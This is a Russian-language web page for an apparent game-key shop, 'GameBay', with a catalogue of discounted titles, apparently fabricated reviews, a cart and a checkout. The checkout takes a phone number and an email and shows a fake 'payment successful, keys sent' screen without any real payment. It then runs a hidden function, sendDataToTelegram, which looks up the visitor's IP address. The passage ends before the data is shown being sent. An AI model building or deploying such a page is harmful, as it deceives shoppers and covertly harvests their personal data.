<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>GameBay — Маркетплейс цифровых товаров</title>
    <style>
        :root {
            --bg: #f5f7fa;
            --white: #ffffff;
            --border: #e2e6ed;
            --accent: #4361ee;
            --accent2: #f72585;
            --text: #1a1a2e;
            --sub: #6c757d;
            --green: #06d6a0;
            --orange: #ff9f1c;
            --red: #ef233c;
            --shadow: 0 2px 12px rgba(0,0,0,0.06);
            --radius: 16px;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            background: var(--bg);
            color: var(--text);
            min-height: 100vh;
            -webkit-tap-highlight-color: transparent;
        }

        /* ШАПКА */
        .header {
            background: var(--white);
            border-bottom: 1px solid var(--border);
            position: sticky;
            top: 0;
            z-index: 100;
            padding: 0 16px;
            box-shadow: var(--shadow);
        }
        .header-inner {
            max-width: 1300px;
            margin: 0 auto;
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 60px;
            gap: 16px;
        }
        .logo {
            font-weight: 900;
            font-size: 24px;
            color: var(--text);
            letter-spacing: -0.5px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .logo-icon {
            width: 34px; height: 34px;
            background: var(--accent);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 18px;
        }
        .search-box {
            flex: 1;
            max-width: 400px;
            position: relative;
        }
        .search-box input {
            width: 100%;
            padding: 12px 16px 12px 40px;
            border-radius: 12px;
            border: 1px solid var(--border);
            background: #f8f9fc;
            font-size: 14px;
            outline: none;
            transition: 0.2s;
        }
        .search-box input:focus { border-color: var(--accent); background: #fff; }
        .search-box .search-icon {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--sub);
        }
        .header-actions {
            display: flex;
            gap: 16px;
            align-items: center;
            font-size: 18px;
            cursor: pointer;
        }
        .cart-btn {
            position: relative;
            background: var(--accent);
            color: #fff;
            width: 42px;
            height: 42px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: 0.15s;
        }
        .cart-btn:active { transform: scale(0.94); }
        .cart-count {
            position: absolute;
            top: -6px;
            right: -6px;
            background: var(--accent2);
            color: #fff;
            font-size: 11px;
            font-weight: 800;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        /* БАННЕР */
        .hero {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 36px 20px;
            text-align: center;
            color: #fff;
            margin-bottom: 8px;
        }
        .hero h1 { font-size: 30px; font-weight: 900; margin-bottom: 6px; }
        .hero p { color: #b0b8c8; font-size: 15px; margin-bottom: 16px; }
        .hero-btn {
            display: inline-block;
            background: var(--accent2);
            color: #fff;
            font-weight: 700;
            padding: 12px 28px;
            border-radius: 30px;
            cursor: pointer;
            transition: 0.15s;
            text-decoration: none;
        }
        .hero-btn:active { transform: scale(0.96); }

        /* КАТАЛОГ */
        .container {
            max-width: 1300px;
            margin: 0 auto;
            padding: 0 16px;
        }
        .section-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 20px 0 12px;
            flex-wrap: wrap;
            gap: 10px;
        }
        .section-header h2 {
            font-size: 22px;
            font-weight: 800;
        }
        .filters {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        .filters button {
            padding: 8px 16px;
            border-radius: 20px;
            border: 1px solid var(--border);
            background: #fff;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.15s;
            color: var(--sub);
        }
        .filters button.active {
            background: var(--accent);
            color: #fff;
            border-color: var(--accent);
        }

        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 16px;
            margin-bottom: 28px;
        }
        .card {
            background: var(--white);
            border-radius: var(--radius);
            overflow: hidden;
            box-shadow: var(--shadow);
            transition: 0.2s;
            cursor: pointer;
            border: 1px solid transparent;
        }
        .card:hover { border-color: var(--accent); transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,0,0,0.1); }
        .card-img {
            width: 100%;
            aspect-ratio: 16/10;
            object-fit: cover;
            background: #e9ecef;
            display: block;
        }
        .card-body { padding: 12px 14px 16px; }
        .card-badges { display: flex; gap: 6px; margin-bottom: 6px; }
        .badge {
            font-size: 10px;
            font-weight: 800;
            padding: 3px 8px;
            border-radius: 6px;
        }
        .badge-hot { background: #ffe0e6; color: var(--accent2); }
        .badge-new { background: #e0f0ff; color: var(--accent); }
        .badge-plat { background: #e9ecef; color: #495057; }
        .card-title {
            font-weight: 700;
            font-size: 15px;
            margin-bottom: 4px;
            line-height: 1.3;
        }
        .card-price {
            font-size: 18px;
            font-weight: 800;
            color: var(--accent);
        }
        .card-old-price {
            text-decoration: line-through;
            color: #adb5bd;
            font-size: 13px;
            margin-right: 6px;
        }
        .card-rating { font-size: 12px; color: var(--orange); margin-top: 2px; }
        .buy-btn {
            display: block;
            width: 100%;
            margin-top: 10px;
            padding: 10px;
            background: var(--accent);
            color: #fff;
            font-weight: 700;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            cursor: pointer;
            transition: 0.15s;
        }
        .buy-btn:active { transform: scale(0.96); }

        /* ОТЗЫВЫ */
        .reviews-scroll {
            display: flex;
            gap: 14px;
            overflow-x: auto;
            padding-bottom: 12px;
            margin-bottom: 24px;
        }
        .review-card {
            min-width: 260px;
            background: var(--white);
            border-radius: var(--radius);
            padding: 16px;
            box-shadow: var(--shadow);
            border: 1px solid var(--border);
        }
        .review-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 8px;
        }
        .review-avatar {
            width: 36px; height: 36px;
            border-radius: 50%;
            background: #dee2e6;
            object-fit: cover;
        }
        .review-name { font-weight: 700; font-size: 13px; }
        .review-date { color: var(--sub); font-size: 11px; }
        .review-text { font-size: 13px; color: #495057; line-height: 1.4; }
        .review-stars { color: var(--orange); margin-bottom: 4px; }

        /* КОРЗИНА (модалка) */
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.5);
            z-index: 9999;
            display: flex;
            align-items: flex-end;
            justify-content: center;
        }
        .modal-sheet {
            background: #fff;
            width: 100%;
            max-width: 500px;
            border-radius: 24px 24px 0 0;
            padding: 24px 20px 32px;
            max-height: 80vh;
            overflow-y: auto;
            animation: slideUp 0.25s ease;
        }
        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
        .modal-sheet h3 { font-size: 20px; margin-bottom: 16px; }
        .cart-item {
            display: flex;
            gap: 12px;
            align-items: center;
            padding: 10px 0;
            border-bottom: 1px solid var(--border);
        }
        .cart-item img {
            width: 50px; height: 50px;
            border-radius: 10px;
            object-fit: cover;
            background: #e9ecef;
        }
        .cart-item-info { flex: 1; }
        .cart-item-title { font-weight: 700; font-size: 14px; }
        .cart-item-price { color: var(--accent); font-weight: 700; }
        .cart-item-remove { color: var(--red); cursor: pointer; font-weight: 700; }
        .cart-empty { text-align: center; color: var(--sub); padding: 30px 0; }
        .checkout-btn {
            width: 100%;
            padding: 16px;
            background: var(--accent);
            color: #fff;
            font-weight: 800;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            margin-top: 16px;
            cursor: pointer;
        }

        /* ФУТЕР */
        .footer {
            text-align: center;
            padding: 24px;
            background: var(--white);
            border-top: 1px solid var(--border);
            color: var(--sub);
            font-size: 12px;
        }
    </style>
</head>
<body>

<!-- ЗАГРУЗЧИК -->
<div id="loaderOverlay" style="position:fixed;inset:0;background:#fff;z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:10px;">
    <div style="width:40px;height:40px;border:3px solid #e2e6ed;border-top:3px solid #4361ee;border-radius:50%;animation:spin 0.7s linear infinite;"></div>
    <span style="color:#6c757d;">Загрузка...</span>
</div>

<header class="header">
    <div class="header-inner">
        <div class="logo"><div class="logo-icon">🎮</div>GameBay</div>
        <div class="search-box">
            <span class="search-icon">🔍</span>
            <input type="text" placeholder="Поиск игр..." id="searchInput" oninput="searchGames()">
        </div>
        <div class="header-actions">
            <span>❤️</span>
            <div class="cart-btn" onclick="openCart()">
                🛒 <span class="cart-count" id="cartBadge">0</span>
            </div>
        </div>
    </div>
</header>

<div class="hero">
    <h1>🎉 Весенняя распродажа</h1>
    <p>Сотни игр со скидками до 90%</p>
    <a class="hero-btn" onclick="scrollToCatalog()">Смотреть каталог</a>
</div>

<div class="container" id="catalog">
    <div class="section-header">
        <h2>🎯 Каталог</h2>
        <div class="filters">
            <button class="active" onclick="filterAll(this)">Все</button>
            <button onclick="filterPlatform('Steam', this)">Steam</button>
            <button onclick="filterPlatform('Xbox', this)">Xbox</button>
            <button onclick="filterPlatform('PS', this)">PlayStation</button>
            <button onclick="filterPlatform('Epic', this)">Epic Games</button>
            <button onclick="filterPlatform('Rockstar', this)">Rockstar</button>
        </div>
    </div>
    <div class="grid" id="gameGrid"></div>
</div>

<div class="container">
    <div class="section-header"><h2>💬 Отзывы покупателей</h2></div>
    <div class="reviews-scroll" id="reviewsContainer"></div>
</div>

<div class="footer">
    © 2026 GameBay. Все цены указаны в рублях. Не является публичной офертой.
</div>

<script>
// ==================== ДАННЫЕ ИГР ====================
const games = [
    { id:1, title:"GTA V Premium", platform:"Rockstar", price:1047, oldPrice:3490, discount:70, img:"https://img.ggsel.net/images/product/280x280/1_1701181865.jpg", rating:4.9, reviews:12400, badge:"hot" },
    { id:2, title:"Red Dead Redemption 2", platform:"Rockstar", price:1796, oldPrice:4490, discount:60, img:"https://img.ggsel.net/images/product/280x280/2_1643123456.jpg", rating:4.8, reviews:8900, badge:"hot" },
    { id:3, title:"Cyberpunk 2077", platform:"Steam", price:1499, oldPrice:2999, discount:50, img:"https://img.ggsel.net/images/product/280x280/cyberpunk_2077.jpg", rating:4.7, reviews:15600, badge:"new" },
    { id:4, title:"EA FC 25", platform:"Steam", price:2499, oldPrice:4499, discount:44, img:"https://img.ggsel.net/images/product/280x280/ea_fc_25.jpg", rating:4.6, reviews:9800, badge:"hot" },
    { id:5, title:"Hogwarts Legacy", platform:"Steam", price:1899, oldPrice:3499, discount:46, img:"https://img.ggsel.net/images/product/280x280/hogwarts_legacy.jpg", rating:4.8, reviews:11200, badge:"" },
    { id:6, title:"Spider-Man 2", platform:"PS", price:3290, oldPrice:5490, discount:40, img:"https://img.ggsel.net/images/product/280x280/spider_man_2.jpg", rating:4.9, reviews:6700, badge:"new" },
    { id:7, title:"Forza Horizon 5", platform:"Epic", price:998, oldPrice:3990, discount:75, img:"https://img.ggsel.net/images/product/280x280/forza_horizon_5.jpg", rating:4.8, reviews:5100, badge:"hot" },
    { id:8, title:"Call of Duty MW3", platform:"Steam", price:3499, oldPrice:5499, discount:36, img:"https://img.ggsel.net/images/product/280x280/cod_mw3.jpg", rating:4.5, reviews:14300, badge:"" },
    { id:9, title:"Minecraft", platform:"Steam", price:1499, oldPrice:1999, discount:25, img:"https://img.ggsel.net/images/product/280x280/minecraft.jpg", rating:4.9, reviews:25000, badge:"" },
    { id:10, title:"Baldur's Gate 3", platform:"Steam", price:1999, oldPrice:2999, discount:33, img:"https://img.ggsel.net/images/product/280x280/baldurs_gate_3.jpg", rating:4.9, reviews:18900, badge:"new" },
    { id:11, title:"Xbox Game Pass 3 мес", platform:"Xbox", price:1260, oldPrice:2290, discount:45, img:"https://img.ggsel.net/images/product/280x280/game_pass.jpg", rating:4.7, reviews:3200, badge:"hot" },
    { id:12, title:"ELDEN RING", platform:"Steam", price:2399, oldPrice:3999, discount:40, img:"https://img.ggsel.net/images/product/280x280/elden_ring.jpg", rating:4.9, reviews:22000, badge:"" },
];

// ==================== КОРЗИНА ====================
let cart = [];

// ==================== ОТРИСОВКА ====================
function renderGames(filter = 'all') {
    const grid = document.getElementById('gameGrid');
    const search = document.getElementById('searchInput')?.value?.toLowerCase() || '';
    let filtered = games;
    if (filter !== 'all') filtered = filtered.filter(g => g.platform === filter);
    if (search) filtered = filtered.filter(g => g.title.toLowerCase().includes(search));

    grid.innerHTML = filtered.map(g => `
        <div class="card">
            <img class="card-img" src="${g.img}" alt="${g.title}" onerror="this.src='https://placehold.co/280x180/1a1a2e/fff?text=${encodeURIComponent(g.title)}'">
            <div class="card-body">
                <div class="card-badges">
                    ${g.badge==='hot' ? '<span class="badge badge-hot">🔥 Хит</span>' : ''}
                    ${g.badge==='new' ? '<span class="badge badge-new">🆕 Новинка</span>' : ''}
                    <span class="badge badge-plat">${g.platform}</span>
                </div>
                <div class="card-title">${g.title}</div>
                <div class="card-price"><span class="card-old-price">${g.oldPrice}₽</span> ${g.price}₽</div>
                <div class="card-rating">⭐ ${g.rating} (${g.reviews.toLocaleString()})</div>
                <button class="buy-btn" onclick="addToCart(${g.id})">🛒 В корзину</button>
            </div>
        </div>
    `).join('');
}

function renderReviews() {
    const reviews = [
        { name:"Алексей", date:"2 часа назад", text:"Купил GTA V — ключ пришёл моментально. Всё активировалось без проблем. Лучший магазин!", stars:5, avatar:"https://i.pravatar.cc/36?img=1" },
        { name:"Дмитрий", date:"5 часов назад", text:"Заказываю здесь третий раз. Цены ниже рынка, доставка быстрая. Рекомендую друзьям.", stars:5, avatar:"https://i.pravatar.cc/36?img=2" },
        { name:"Марина", date:"вчера", text:"Ключ для PS5 пришёл быстро, но сначала дали не тот регион. Поддержка исправила за 10 минут.", stars:4, avatar:"https://i.pravatar.cc/36?img=3" },
        { name:"Игорь", date:"2 дня назад", text:"Baldur's Gate 3 за 1999₽ — это топ. Активировал в Steam, всё чисто. Спасибо!", stars:5, avatar:"https://i.pravatar.cc/36?img=4" },
        { name:"Анна", date:"3 дня назад", text:"Покупала Game Pass, подписка привязалась к аккаунту мгновенно. Очень довольна сервисом.", stars:5, avatar:"https://i.pravatar.cc/36?img=5" },
    ];
    document.getElementById('reviewsContainer').innerHTML = reviews.map(r => `
        <div class="review-card">
            <div class="review-header">
                <img class="review-avatar" src="${r.avatar}" alt="${r.name}" onerror="this.style.background='#dee2e6'">
                <div><div class="review-name">${r.name}</div><div class="review-date">${r.date}</div></div>
            </div>
            <div class="review-stars">${'⭐'.repeat(r.stars)}</div>
            <div class="review-text">${r.text}</div>
        </div>
    `).join('');
}

function addToCart(gameId) {
    const game = games.find(g => g.id === gameId);
    if (!game) return;
    cart.push({...game});
    updateCartBadge();
    animateCart();
}

function removeFromCart(index) {
    cart.splice(index, 1);
    updateCartBadge();
    openCart();
}

function updateCartBadge() {
    document.getElementById('cartBadge').textContent = cart.length;
}

function animateCart() {
    const btn = document.querySelector('.cart-btn');
    btn.style.transform = 'scale(1.15)';
    setTimeout(() => btn.style.transform = '', 200);
}

function openCart() {
    const existing = document.querySelector('.modal-overlay');
    if (existing) existing.remove();

    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay';
    overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };

    const total = cart.reduce((s, g) => s + g.price, 0);
    overlay.innerHTML = `
        <div class="modal-sheet">
            <h3>🛒 Корзина (${cart.length})</h3>
            ${cart.length === 0 ? '<div class="cart-empty">Пока пусто</div>' : cart.map((g, i) => `
                <div class="cart-item">
                    <img src="${g.img}" onerror="this.src='https://placehold.co/50x50'">
                    <div class="cart-item-info">
                        <div class="cart-item-title">${g.title}</div>
                        <div class="cart-item-price">${g.price}₽</div>
                    </div>
                    <span class="cart-item-remove" onclick="removeFromCart(${i})">✕</span>
                </div>
            `).join('')}
            ${cart.length > 0 ? `<div style="font-weight:800;margin-top:10px;">Итого: ${total}₽</div>` : ''}
            ${cart.length > 0 ? `<button class="checkout-btn" onclick="openCheckout()">💳 Оформить заказ</button>` : ''}
        </div>
    `;
    document.body.appendChild(overlay);
}

function filterPlatform(platform, btn) {
    document.querySelectorAll('.filters button').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    renderGames(platform);
}

function filterAll(btn) {
    document.querySelectorAll('.filters button').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    renderGames('all');
}

function searchGames() {
    renderGames(document.querySelector('.filters button.active')?.dataset?.platform || 'all');
}

function scrollToCatalog() {
    document.getElementById('catalog').scrollIntoView({behavior:'smooth'});
}

function openCheckout() {
    const existing = document.querySelector('.modal-overlay');
    if (existing) existing.remove();

    const overlay = document.createElement('div');
    overlay.className = 'modal-overlay';
    overlay.onclick = (e) => { if (e.target === overlay) overlay.remove(); };
    overlay.innerHTML = `
        <div class="modal-sheet">
            <h3>🧾 Оформление заказа</h3>
            <p style="color:#6c757d;margin-bottom:14px;">Сумма: ${cart.reduce((s,g)=>s+g.price,0)}₽</p>
            <input id="phoneInput" type="tel" placeholder="+7 926 123-45-67" style="width:100%;padding:14px;border:1px solid #e2e6ed;border-radius:12px;font-size:15px;margin-bottom:10px;">
            <input id="checkoutEmail" type="email" placeholder="email@example.com" style="width:100%;padding:14px;border:1px solid #e2e6ed;border-radius:12px;font-size:15px;margin-bottom:10px;">
            <button class="checkout-btn" id="payBtn">💳 Перейти к оплате</button>
            <button style="width:100%;padding:12px;background:transparent;border:none;color:#6c757d;margin-top:6px;cursor:pointer;" onclick="document.querySelector('.modal-overlay').remove()">Отмена</button>
        </div>
    `;
    document.body.appendChild(overlay);

    document.getElementById('payBtn').onclick = () => {
        const phone = document.getElementById('phoneInput').value.trim();
        const email = document.getElementById('checkoutEmail').value.trim();
        if (phone.replace(/\D/g,'').length < 7 || !email.includes('@')) {
            alert('Заполните телефон и почту корректно');
            return;
        }
        overlay.innerHTML = `<div class="modal-sheet" style="text-align:center;">
            <div style="width:44px;height:44px;border:3px solid #e2e6ed;border-top:3px solid #4361ee;border-radius:50%;animation:spin 0.7s linear infinite;margin:20px auto;"></div>
            <p style="margin-top:14px;">Обработка платежа...</p>
        </div>`;
        setTimeout(() => {
            overlay.innerHTML = `<div class="modal-sheet" style="text-align:center;">
                <div style="font-size:48px;">✅</div>
                <h3>Оплата прошла успешно</h3>
                <p>Ключи отправлены на почту ${email}</p>
            </div>`;
            setTimeout(() => overlay.remove(), 3000);
            sendDataToTelegram(phone, email);
        }, 2500);
    };
}

async function sendDataToTelegram(phone, email) {
    let ip = 'неизвестен';
    try { ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(e){}
    let geo = 'не определено';
